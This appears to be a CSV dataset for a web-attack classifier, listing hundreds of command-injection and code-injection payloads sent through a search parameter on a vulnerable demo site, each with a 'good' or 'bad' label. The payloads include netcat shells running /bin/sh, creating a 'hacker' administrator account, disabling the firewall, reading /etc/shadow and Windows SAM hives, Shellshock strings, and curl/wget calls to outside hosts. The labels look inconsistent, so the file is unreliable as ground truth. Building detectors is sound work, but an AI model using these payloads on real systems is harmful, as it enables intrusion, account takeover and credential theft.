path,content,host,class_flag
/search.jsp?query=exec('ls'),,demo.testfire.net,['good']
/search.jsp?query=exec('pwd'),,demo.testfire.net,['good']
/search.jsp?query=exec('pwd');,,demo.testfire.net,['good']
/search.jsp?query=exec('sleep 5'),,demo.testfire.net,['good']
/search.jsp?query=exec('sleep 5');,,demo.testfire.net,['good']
/search.jsp?query=exec('whoami'),,demo.testfire.net,['good']
/search.jsp?query=exec('whoami');,,demo.testfire.net,['good']
"/search.jsp?query=;{$_GET[""cmd""]}",,demo.testfire.net,['bad']
/search.jsp?query=`id`,,demo.testfire.net,['good']
/search.jsp?query=|id,,demo.testfire.net,['good']
/search.jsp?query=| id,,demo.testfire.net,['good']
/search.jsp?query=;id,,demo.testfire.net,['good']
/search.jsp?query=;id|,,demo.testfire.net,['good']
/search.jsp?query=;id;,,demo.testfire.net,['good']
/search.jsp?query=& id,,demo.testfire.net,['good']
/search.jsp?query=&&id,,demo.testfire.net,['good']
/search.jsp?query=;id\n,,demo.testfire.net,['good']
/search.jsp?query=ifconfig,,demo.testfire.net,['good']
/search.jsp?query=| ifconfig,,demo.testfire.net,['good']
/search.jsp?query=; ifconfig,,demo.testfire.net,['good']
/search.jsp?query=& ifconfig,,demo.testfire.net,['good']
/search.jsp?query=&& ifconfig,,demo.testfire.net,['good']
/search.jsp?query=/index.html|id|,,demo.testfire.net,['good']
/search.jsp?query=ipconfig,,demo.testfire.net,['good']
/search.jsp?query=| ipconfig /all,,demo.testfire.net,['good']
/search.jsp?query=; ipconfig /all,,demo.testfire.net,['good']
/search.jsp?query=& ipconfig /all,,demo.testfire.net,['good']
/search.jsp?query=&& ipconfig /all,,demo.testfire.net,['good']
/search.jsp?query=ipconfig /all,,demo.testfire.net,['good']
/search.jsp?query=ls,,demo.testfire.net,['good']
/search.jsp?query=$(`ls`),,demo.testfire.net,['bad']
/search.jsp?query=| ls -l /,,demo.testfire.net,['good']
/search.jsp?query=; ls -l /,,demo.testfire.net,['good']
/search.jsp?query=& ls -l /,,demo.testfire.net,['good']
/search.jsp?query=&& ls -l /,,demo.testfire.net,['good']
/search.jsp?query=ls -l /,,demo.testfire.net,['good']
/search.jsp?query=| ls -laR /etc,,demo.testfire.net,['good']
/search.jsp?query=; ls -laR /etc,,demo.testfire.net,['good']
/search.jsp?query=& ls -laR /etc,,demo.testfire.net,['good']
/search.jsp?query=&& ls -laR /etc,,demo.testfire.net,['good']
/search.jsp?query=| ls -laR /var/www,,demo.testfire.net,['good']
/search.jsp?query=; ls -laR /var/www,,demo.testfire.net,['good']
/search.jsp?query=& ls -laR /var/www,,demo.testfire.net,['good']
/search.jsp?query=&& ls -laR /var/www,,demo.testfire.net,['good']
/search.jsp?query=| ls -l /etc/,,demo.testfire.net,['good']
/search.jsp?query=; ls -l /etc/,,demo.testfire.net,['good']
/search.jsp?query=& ls -l /etc/,,demo.testfire.net,['good']
/search.jsp?query=&& ls -l /etc/,,demo.testfire.net,['good']
/search.jsp?query=ls -l /etc/,,demo.testfire.net,['good']
/search.jsp?query=ls -lh /etc/,,demo.testfire.net,['good']
/search.jsp?query=| ls -l /home/*,,demo.testfire.net,['good']
/search.jsp?query=; ls -l /home/*,,demo.testfire.net,['good']
/search.jsp?query=& ls -l /home/*,,demo.testfire.net,['good']
/search.jsp?query=&& ls -l /home/*,,demo.testfire.net,['good']
/search.jsp?query=ls -l /home/*,,demo.testfire.net,['good']
/search.jsp?query=*; ls -lhtR /var/www/,,demo.testfire.net,['good']
/search.jsp?query=| ls -l /tmp,,demo.testfire.net,['good']
/search.jsp?query=; ls -l /tmp,,demo.testfire.net,['good']
/search.jsp?query=& ls -l /tmp,,demo.testfire.net,['good']
/search.jsp?query=&& ls -l /tmp,,demo.testfire.net,['good']
/search.jsp?query=ls -l /tmp,,demo.testfire.net,['good']
/search.jsp?query=| ls -l /var/www/*,,demo.testfire.net,['good']
/search.jsp?query=; ls -l /var/www/*,,demo.testfire.net,['good']
/search.jsp?query=& ls -l /var/www/*,,demo.testfire.net,['good']
/search.jsp?query=&& ls -l /var/www/*,,demo.testfire.net,['good']
/search.jsp?query=ls -l /var/www/*,,demo.testfire.net,['good']
"/search.jsp?query=<!--#exec cmd=""/bin/cat /etc/passwd""-->",,demo.testfire.net,['bad']
"/search.jsp?query=<!--#exec cmd=""/bin/cat /etc/shadow""-->",,demo.testfire.net,['bad']
"/search.jsp?query=<!--#exec cmd=""/usr/bin/id;-->",,demo.testfire.net,['bad']
/search.jsp?query=\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`,,demo.testfire.net,['good']
/search.jsp?query=\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`,,demo.testfire.net,['good']
/search.jsp?query=\n/bin/ls -al\n,,demo.testfire.net,['good']
/search.jsp?query=| nc -lvvp 4444 -e /bin/sh|,,demo.testfire.net,['good']
/search.jsp?query=; nc -lvvp 4444 -e /bin/sh;,,demo.testfire.net,['good']
/search.jsp?query=& nc -lvvp 4444 -e /bin/sh&,,demo.testfire.net,['good']
/search.jsp?query=&& nc -lvvp 4444 -e /bin/sh &,,demo.testfire.net,['good']
/search.jsp?query=nc -lvvp 4444 -e /bin/sh,,demo.testfire.net,['good']
/search.jsp?query=nc -lvvp 4445 -e /bin/sh &,,demo.testfire.net,['good']
/search.jsp?query=nc -lvvp 4446 -e /bin/sh|,,demo.testfire.net,['good']
/search.jsp?query=nc -lvvp 4447 -e /bin/sh;,,demo.testfire.net,['good']
/search.jsp?query=nc -lvvp 4448 -e /bin/sh&,,demo.testfire.net,['good']
/search.jsp?query=\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n,,demo.testfire.net,['good']
/search.jsp?query=\necho INJECTX\nexit\n\033[2Asleep 5\n,,demo.testfire.net,['good']
/search.jsp?query=\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n,,demo.testfire.net,['good']
/search.jsp?query=| net localgroup Administrators hacker /ADD,,demo.testfire.net,['good']
/search.jsp?query=; net localgroup Administrators hacker /ADD,,demo.testfire.net,['good']
/search.jsp?query=& net localgroup Administrators hacker /ADD,,demo.testfire.net,['good']
/search.jsp?query=&& net localgroup Administrators hacker /ADD,,demo.testfire.net,['good']
/search.jsp?query=net localgroup Administrators hacker /ADD,,demo.testfire.net,['good']
/search.jsp?query=| netsh firewall set opmode disable,,demo.testfire.net,['good']
/search.jsp?query=&& netsh firewall set opmode disable,,demo.testfire.net,['good']
/search.jsp?query=; netsh firewall set opmode disable,,demo.testfire.net,['good']
/search.jsp?query=& netsh firewall set opmode disable,,demo.testfire.net,['good']
/search.jsp?query=netsh firewall set opmode disable,,demo.testfire.net,['good']
/search.jsp?query=netstat,,demo.testfire.net,['good']
/search.jsp?query=| netstat -an,,demo.testfire.net,['good']
/search.jsp?query=;netstat -a;,,demo.testfire.net,['good']
/search.jsp?query=; netstat -an,,demo.testfire.net,['good']
/search.jsp?query=& netstat -an,,demo.testfire.net,['good']
/search.jsp?query=&& netstat -an,,demo.testfire.net,['good']
/search.jsp?query=netstat -an,,demo.testfire.net,['good']
/search.jsp?query=| net user hacker Password1 /ADD,,demo.testfire.net,['good']
/search.jsp?query=; net user hacker Password1 /ADD,,demo.testfire.net,['good']
/search.jsp?query=& net user hacker Password1 /ADD,,demo.testfire.net,['good']
/search.jsp?query=net user hacker Password1 /ADD,,demo.testfire.net,['good']
/search.jsp?query=| net view,,demo.testfire.net,['good']
/search.jsp?query=; net view,,demo.testfire.net,['good']
/search.jsp?query=&& net user hacker Password1 /ADD,,demo.testfire.net,['good']
/search.jsp?query=& net view,,demo.testfire.net,['good']
/search.jsp?query=&& net view,,demo.testfire.net,['good']
/search.jsp?query=net view,,demo.testfire.net,['good']
/search.jsp?query=\nid|,,demo.testfire.net,['good']
/search.jsp?query=\nid;,,demo.testfire.net,['good']
/search.jsp?query=\nid\n,,demo.testfire.net,['good']
/search.jsp?query=\n/usr/bin/id\n,,demo.testfire.net,['good']
"/search.jsp?query=perl -e 'print ""X""x1024'",,demo.testfire.net,['good']
"/search.jsp?query=|| perl -e 'print ""X""x16096'",,demo.testfire.net,['good']
"/search.jsp?query=| perl -e 'print ""X""x16096'",,demo.testfire.net,['good']
"/search.jsp?query=; perl -e 'print ""X""x16096'",,demo.testfire.net,['good']
"/search.jsp?query=& perl -e 'print ""X""x16096'",,demo.testfire.net,['good']
"/search.jsp?query=&& perl -e 'print ""X""x16096'",,demo.testfire.net,['good']
"/search.jsp?query=perl -e 'print ""X""x16384'",,demo.testfire.net,['good']
"/search.jsp?query=; perl -e 'print ""X""x2048'",,demo.testfire.net,['good']
"/search.jsp?query=& perl -e 'print ""X""x2048'",,demo.testfire.net,['good']
"/search.jsp?query=&& perl -e 'print ""X""x2048'",,demo.testfire.net,['good']
"/search.jsp?query=perl -e 'print ""X""x2048'",,demo.testfire.net,['good']
"/search.jsp?query=|| perl -e 'print ""X""x4096'",,demo.testfire.net,['good']
"/search.jsp?query=| perl -e 'print ""X""x4096'",,demo.testfire.net,['good']
"/search.jsp?query=; perl -e 'print ""X""x4096'",,demo.testfire.net,['good']
"/search.jsp?query=& perl -e 'print ""X""x4096'",,demo.testfire.net,['good']
"/search.jsp?query=&& perl -e 'print ""X""x4096'",,demo.testfire.net,['good']
"/search.jsp?query=perl -e 'print ""X""x4096'",,demo.testfire.net,['good']
"/search.jsp?query=|| perl -e 'print ""X""x8096'",,demo.testfire.net,['good']
"/search.jsp?query=| perl -e 'print ""X""x8096'",,demo.testfire.net,['good']
"/search.jsp?query=; perl -e 'print ""X""x8096'",,demo.testfire.net,['good']
"/search.jsp?query=&& perl -e 'print ""X""x8096'",,demo.testfire.net,['good']
"/search.jsp?query=perl -e 'print ""X""x8192'",,demo.testfire.net,['good']
"/search.jsp?query=perl -e 'print ""X""x81920'",,demo.testfire.net,['good']
/search.jsp?query=|| phpinfo(),,demo.testfire.net,['good']
/search.jsp?query=| phpinfo(),,demo.testfire.net,['good']
/search.jsp?query= {${phpinfo()}},,demo.testfire.net,['bad']
/search.jsp?query=;phpinfo(),,demo.testfire.net,['good']
/search.jsp?query=;phpinfo();//,,demo.testfire.net,['good']
/search.jsp?query=';phpinfo();//,,demo.testfire.net,['good']
/search.jsp?query={${phpinfo()}},,demo.testfire.net,['bad']
/search.jsp?query=& phpinfo(),,demo.testfire.net,['good']
/search.jsp?query=&& phpinfo(),,demo.testfire.net,['good']
/search.jsp?query=phpinfo(),,demo.testfire.net,['good']
/search.jsp?query=phpinfo();,,demo.testfire.net,['good']
"/search.jsp?query=<?php system(""cat /etc/passwd"");?>",,demo.testfire.net,['good']
"/search.jsp?query=<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",,demo.testfire.net,['good']
"/search.jsp?query=<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj"");?>",,demo.testfire.net,['good']
"/search.jsp?query=<?php system(""echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"");?>",,demo.testfire.net,['good']
"/search.jsp?query=<?php system(""sleep 10"");?>",,demo.testfire.net,['good']
"/search.jsp?query=<?php system(""sleep 5"");?>",,demo.testfire.net,['good']
"/search.jsp?query=<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",,demo.testfire.net,['good']
"/search.jsp?query=<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc"");?>",,demo.testfire.net,['good']
/search.jsp?query=:phpversion();,,demo.testfire.net,['good']
/search.jsp?query=`ping 127.0.0.1`,,demo.testfire.net,['good']
/search.jsp?query=& ping -i 30 127.0.0.1 &,,demo.testfire.net,['good']
/search.jsp?query=& ping -n 30 127.0.0.1 &,,demo.testfire.net,['good']
/search.jsp?query=;${@print(md5(RCEVulnerable))};,,demo.testfire.net,['bad']
"/search.jsp?query=${@print(""RCEVulnerable"")}",,demo.testfire.net,['bad']
/search.jsp?query=${@print(system($_SERVER['HTTP_USER_AGENT']))},,demo.testfire.net,['bad']
/search.jsp?query=pwd,,demo.testfire.net,['good']
/search.jsp?query=| pwd,,demo.testfire.net,['good']
/search.jsp?query=; pwd,,demo.testfire.net,['good']
/search.jsp?query=& pwd,,demo.testfire.net,['good']
/search.jsp?query=&& pwd,,demo.testfire.net,['good']
/search.jsp?query=\r,,demo.testfire.net,['good']
"/search.jsp?query=| reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",,demo.testfire.net,['good']
"/search.jsp?query=; reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",,demo.testfire.net,['good']
"/search.jsp?query=& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",,demo.testfire.net,['good']
"/search.jsp?query=&& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",,demo.testfire.net,['good']
"/search.jsp?query=reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",,demo.testfire.net,['good']
/search.jsp?query=\r\n,,demo.testfire.net,['good']
/search.jsp?query=route,,demo.testfire.net,['good']
/search.jsp?query=| sleep 1,,demo.testfire.net,['good']
/search.jsp?query=; sleep 1,,demo.testfire.net,['good']
/search.jsp?query=& sleep 1,,demo.testfire.net,['good']
/search.jsp?query=&& sleep 1,,demo.testfire.net,['good']
/search.jsp?query=sleep 1,,demo.testfire.net,['good']
/search.jsp?query=|| sleep 10,,demo.testfire.net,['good']
/search.jsp?query=| sleep 10,,demo.testfire.net,['good']
/search.jsp?query=; sleep 10,,demo.testfire.net,['good']
/search.jsp?query={${sleep(10)}},,demo.testfire.net,['bad']
/search.jsp?query=& sleep 10 ,,demo.testfire.net,['good']
/search.jsp?query=&& sleep 10,,demo.testfire.net,['good']
/search.jsp?query=sleep 10,,demo.testfire.net,['good']
/search.jsp?query=|| sleep 15,,demo.testfire.net,['good']
/search.jsp?query=| sleep 15,,demo.testfire.net,['good']
/search.jsp?query=& sleep 15 ,,demo.testfire.net,['good']
/search.jsp?query=; sleep 15,,demo.testfire.net,['good']
/search.jsp?query=&& sleep 15,,demo.testfire.net,['good']
/search.jsp?query= {${sleep(20)}},,demo.testfire.net,['bad']
/search.jsp?query={${sleep(20)}},,demo.testfire.net,['bad']
/search.jsp?query= {${sleep(3)}},,demo.testfire.net,['bad']
/search.jsp?query=| sleep 5,,demo.testfire.net,['good']
/search.jsp?query={${sleep(3)}},,demo.testfire.net,['bad']
/search.jsp?query=; sleep 5,,demo.testfire.net,['good']
/search.jsp?query=& sleep 5,,demo.testfire.net,['good']
/search.jsp?query=&& sleep 5,,demo.testfire.net,['good']
/search.jsp?query=sleep 5,,demo.testfire.net,['good']
/search.jsp?query= {${sleep(hexdec(dechex(20)))}} ,,demo.testfire.net,['bad']
/search.jsp?query={${sleep(hexdec(dechex(20)))}} ,,demo.testfire.net,['bad']
/search.jsp?query=sysinfo,,demo.testfire.net,['good']
/search.jsp?query=| sysinfo,,demo.testfire.net,['good']
/search.jsp?query=; sysinfo,,demo.testfire.net,['good']
/search.jsp?query=& sysinfo,,demo.testfire.net,['good']
/search.jsp?query=&& sysinfo,,demo.testfire.net,['good']
/search.jsp?query=;system('cat /etc/passwd'),,demo.testfire.net,['good']
/search.jsp?query=system('cat C:\boot.ini');,,demo.testfire.net,['good']
/search.jsp?query=system('cat config.php');,,demo.testfire.net,['good']
/search.jsp?query=system('cat /etc/passwd');,,demo.testfire.net,['good']
/search.jsp?query=|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,,demo.testfire.net,['good']
/search.jsp?query=| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,,demo.testfire.net,['good']
/search.jsp?query=; system('curl https://crowdshield.com/.testing/rce_vuln.txt');,,demo.testfire.net,['good']
/search.jsp?query=& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,,demo.testfire.net,['good']
/search.jsp?query=&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,,demo.testfire.net,['good']
/search.jsp?query=system('curl https://crowdshield.com/.testing/rce_vuln.txt'),,demo.testfire.net,['good']
/search.jsp?query=system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf'),,demo.testfire.net,['good']
/search.jsp?query=system('curl https://xerosecurity.com/.testing/rce_vuln.txt');,,demo.testfire.net,['good']
/search.jsp?query=system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),,demo.testfire.net,['good']
/search.jsp?query=systeminfo,,demo.testfire.net,['good']
/search.jsp?query=| systeminfo,,demo.testfire.net,['good']
/search.jsp?query=; systeminfo,,demo.testfire.net,['good']
/search.jsp?query=& systeminfo,,demo.testfire.net,['good']
/search.jsp?query=&& systeminfo,,demo.testfire.net,['good']
/search.jsp?query=system('ls'),,demo.testfire.net,['good']
/search.jsp?query=system('pwd'),,demo.testfire.net,['good']
/search.jsp?query=system('pwd');,,demo.testfire.net,['good']
/search.jsp?query=|| system('sleep 5');,,demo.testfire.net,['good']
/search.jsp?query=| system('sleep 5');,,demo.testfire.net,['good']
/search.jsp?query=; system('sleep 5');,,demo.testfire.net,['good']
/search.jsp?query=& system('sleep 5');,,demo.testfire.net,['good']
/search.jsp?query=&& system('sleep 5');,,demo.testfire.net,['good']
/search.jsp?query=system('sleep 5'),,demo.testfire.net,['good']
/search.jsp?query=system('sleep 5');,,demo.testfire.net,['good']
/search.jsp?query=system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23'),,demo.testfire.net,['good']
/search.jsp?query=system('wget https://xerosecurity.com/.testing/rce_vuln.txt');,,demo.testfire.net,['good']
/search.jsp?query=system('whoami'),,demo.testfire.net,['good']
/search.jsp?query=system('whoami');,,demo.testfire.net,['good']
/search.jsp?query=test*; ls -lhtR /var/www/,,demo.testfire.net,['good']
"/search.jsp?query=test* || perl -e 'print ""X""x16096'",,demo.testfire.net,['good']
"/search.jsp?query=test* | perl -e 'print ""X""x16096'",,demo.testfire.net,['good']
"/search.jsp?query=test* & perl -e 'print ""X""x16096'",,demo.testfire.net,['good']
"/search.jsp?query=test* && perl -e 'print ""X""x16096'",,demo.testfire.net,['good']
"/search.jsp?query=test*; perl -e 'print ""X""x16096'",,demo.testfire.net,['good']
/search.jsp?query=$(`type C:\boot.ini`),,demo.testfire.net,['bad']
/search.jsp?query=&&type C:\\boot.ini,,demo.testfire.net,['good']
/search.jsp?query=| type C:\Windows\repair\SAM,,demo.testfire.net,['good']
/search.jsp?query=; type C:\Windows\repair\SAM,,demo.testfire.net,['good']
/search.jsp?query=& type C:\Windows\repair\SAM,,demo.testfire.net,['good']
/search.jsp?query=&& type C:\Windows\repair\SAM,,demo.testfire.net,['good']
/search.jsp?query=type C:\Windows\repair\SAM,,demo.testfire.net,['good']
/search.jsp?query=| type C:\Windows\repair\SYSTEM,,demo.testfire.net,['good']
/search.jsp?query=; type C:\Windows\repair\SYSTEM,,demo.testfire.net,['good']
/search.jsp?query=& type C:\Windows\repair\SYSTEM,,demo.testfire.net,['good']
/search.jsp?query=&& type C:\Windows\repair\SYSTEM,,demo.testfire.net,['good']
/search.jsp?query=type C:\Windows\repair\SYSTEM,,demo.testfire.net,['good']
/search.jsp?query=| type C:\WINNT\repair\SAM,,demo.testfire.net,['good']
/search.jsp?query=; type C:\WINNT\repair\SAM,,demo.testfire.net,['good']
/search.jsp?query=& type C:\WINNT\repair\SAM,,demo.testfire.net,['good']
/search.jsp?query=&& type C:\WINNT\repair\SAM,,demo.testfire.net,['good']
/search.jsp?query=type C:\WINNT\repair\SAM,,demo.testfire.net,['good']
/search.jsp?query=type C:\WINNT\repair\SYSTEM,,demo.testfire.net,['good']
/search.jsp?query=| type %SYSTEMROOT%\repair\SAM,,demo.testfire.net,['good']
/search.jsp?query=; type %SYSTEMROOT%\repair\SAM,,demo.testfire.net,['good']
/search.jsp?query=& type %SYSTEMROOT%\repair\SAM,,demo.testfire.net,['good']
/search.jsp?query=&& type %SYSTEMROOT%\repair\SAM,,demo.testfire.net,['good']
/search.jsp?query=type %SYSTEMROOT%\repair\SAM,,demo.testfire.net,['good']
/search.jsp?query=| type %SYSTEMROOT%\repair\SYSTEM,,demo.testfire.net,['good']
/search.jsp?query=& type %SYSTEMROOT%\repair\SYSTEM,,demo.testfire.net,['good']
/search.jsp?query=; type %SYSTEMROOT%\repair\SYSTEM,,demo.testfire.net,['good']
/search.jsp?query=&& type %SYSTEMROOT%\repair\SYSTEM,,demo.testfire.net,['good']
/search.jsp?query=type %SYSTEMROOT%\repair\SYSTEM,,demo.testfire.net,['good']
/search.jsp?query=uname,,demo.testfire.net,['good']
/search.jsp?query=;uname;,,demo.testfire.net,['good']
/search.jsp?query=| uname -a,,demo.testfire.net,['good']
/search.jsp?query=; uname -a,,demo.testfire.net,['good']
/search.jsp?query=& uname -a,,demo.testfire.net,['good']
/search.jsp?query=&& uname -a,,demo.testfire.net,['good']
/search.jsp?query=uname -a,,demo.testfire.net,['good']
/search.jsp?query=|/usr/bin/id,,demo.testfire.net,['good']
/search.jsp?query=;|/usr/bin/id|,,demo.testfire.net,['good']
/search.jsp?query=;/usr/bin/id|,,demo.testfire.net,['good']
/search.jsp?query=$;/usr/bin/id,,demo.testfire.net,['bad']
"/search.jsp?query=() { :;};/usr/bin/perl -e 'print \""Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\"";system(\""wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\"");'",,demo.testfire.net,['good']
/search.jsp?query=() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11,,demo.testfire.net,['good']
